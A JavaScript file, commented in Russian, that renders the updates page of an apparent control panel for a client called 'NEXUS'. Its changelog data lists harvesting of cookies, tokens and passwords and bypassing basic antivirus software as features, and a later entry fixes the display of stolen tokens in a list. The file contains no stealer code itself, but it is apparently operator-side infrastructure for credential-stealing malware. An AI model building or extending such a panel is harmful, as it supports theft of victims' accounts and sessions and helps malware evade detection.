// ── ДАННЫЕ ОБНОВЛЕНИЙ ─────────────────────────────────────────────────────────
// Ты можешь добавлять новые версии сюда. 
// Самая первая в списке (индекс 0) считается актуальной (Current).
const UPDATES = [
  {
    version: "1.2.0",
    date: "22.06.2026",
    downloadUrl: "#", // ЗАМЕНИ ЭТУ ССЫЛКУ НА РЕАЛЬНУЮ ССЫЛКУ НА СКАЧИВАНИЕ
    changes: [
      { type: "add", text: "Добавлена поддержка загрузки изображений на аватарки через локальный клиент" },
      { type: "add", text: "Мобильная оптимизация панели (Bottom Navigation Bar)" },
      { type: "fix", text: "Исправлен баг с CORS при запуске клиента без сервера" },
      { type: "fix", text: "Исправлено отображение длинных токенов в списке" }
    ]
  },
  {
    version: "1.1.5",
    date: "18.06.2026",
    downloadUrl: "#",
    changes: [
      { type: "add", text: "Новый дизайн настроек профиля" },
      { type: "add", text: "Добавлен AI Ассистент в панель управления" },
      { type: "fix", text: "Улучшена стабильность соединения с бэкендом" }
    ]
  },
  {
    version: "1.0.0",
    date: "10.06.2026",
    downloadUrl: "#",
    changes: [
      { type: "add", text: "Релиз первой стабильной версии клиента NEXUS" },
      { type: "add", text: "Сбор кукисов, токенов и паролей" },
      { type: "add", text: "Обход базовых антивирусов" }
    ]
  }
];

// ── ОТРИСОВКА ───────────────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  // Инициализируем сайдбар
  const sidebarSlot = document.getElementById('sidebarSlot');
  if (sidebarSlot) sidebarSlot.innerHTML = renderHeader('updates');
  if (typeof bindLogout === 'function') bindLogout();

  renderUpdates();
});

function renderUpdates() {
  const current = UPDATES[0];
  
  // Обновляем Герой-Блок
  document.getElementById('heroVersion').textContent = 'v' + current.version;
  document.getElementById('btnDownloadLatest').href = current.downloadUrl;
  
  // Отрисовываем таймлайн ченджлогов
  const listEl = document.getElementById('changelogList');
  listEl.innerHTML = '';
  
  UPDATES.forEach((update, idx) => {
    const isLatest = idx === 0;
    
    let changesHtml = update.changes.map(c => {
      const icon = c.type === 'add' 
        ? '<span style="color:#10b981;">+</span>' 
        : '<span style="color:#f59e0b;">⚙️</span>';
      return `<div class="change-item">${icon} ${escapeHtml(c.text)}</div>`;
    }).join('');

    const card = document.createElement('div');
    card.className = 'changelog-card';
    if (isLatest) card.classList.add('latest');
    
    card.innerHTML = `
      <div class="changelog-header">
        <h3 class="changelog-version">v${update.version}</h3>
        <span class="changelog-date">${update.date}</span>
        ${isLatest ? '<span class="changelog-badge">Актуальная</span>' : ''}
      </div>
      <div class="changelog-body">
        ${changesHtml}
      </div>
    `;
    
    listEl.appendChild(card);
  });
}
